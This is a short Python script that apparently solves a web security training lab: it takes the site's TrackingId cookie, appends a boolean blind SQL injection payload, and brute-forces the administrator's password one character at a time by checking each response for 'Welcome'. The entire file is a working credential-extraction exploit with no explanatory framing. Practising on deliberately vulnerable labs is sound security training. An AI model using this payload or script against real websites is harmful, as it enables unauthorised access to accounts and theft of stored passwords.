import requests


url = "https://0ad500a90394cce3c3d588c7007b0003.web-security-academy.net/"

r = requests.get(url)

print(r.text)
cookies = dict()
#getting cookie value
for c in r.cookies:
    cookies[c.name]=c.value

cookieval = cookies["TrackingId"]
print(cookieval)
wordlist = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']

for i in range(1,21):
    for j in wordlist:
        query = f"'AND (SELECT substring(password,{i},1) from users where username = 'administrator') = '{j}"
        sqli = cookieval+query
        c = {'TrackingId': sqli}
        r = requests.get(url,cookies=c)
        if("Welcome" in r.text):
            print(j)
            break
